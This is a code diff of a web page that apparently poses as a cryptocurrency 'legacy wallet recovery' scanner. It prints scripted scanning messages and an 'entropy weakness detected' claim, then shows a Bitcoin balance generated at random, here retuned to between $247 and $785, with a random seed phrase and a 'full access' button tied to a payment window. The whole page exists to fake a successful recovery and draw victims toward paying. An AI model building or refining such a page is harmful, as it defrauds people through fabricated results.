@@ -117,7 +117,7 @@ function startScan(){
   setTimeout(()=>log.innerHTML+="Scanning legacy wallets…<br>",4000);
   setTimeout(()=>log.innerHTML+="Entropy weakness detected…<br>",9000);
   setTimeout(()=>{
-    const usd=Math.floor(Math.random()*(5000-1000)+1000);
+    const usd=Math.floor(Math.random()*(785-247+1)+247);
     const btc=(usd/38000).toFixed(5);
     seedText=rndSeed();
     balance.innerHTML=`Wallet recovered<br><br><b>${btc} BTC</b><br>≈ $${usd}`;
@@ -145,6 +145,7 @@ function startSeed(){
       copyBtn.style.display="block";
       valid.style.display="block";
       againBtn.style.display="block";
+      // Кнопка full access создается, но **не показываем окно оплаты**
       createFullAccessButton();
     }
   },1000);
@@ -237,4 +238,4 @@ async function loadMarket(){
 loadMarket();setInterval(loadMarket,60000);
 </script>
 </body>
-  </html>
+</html>
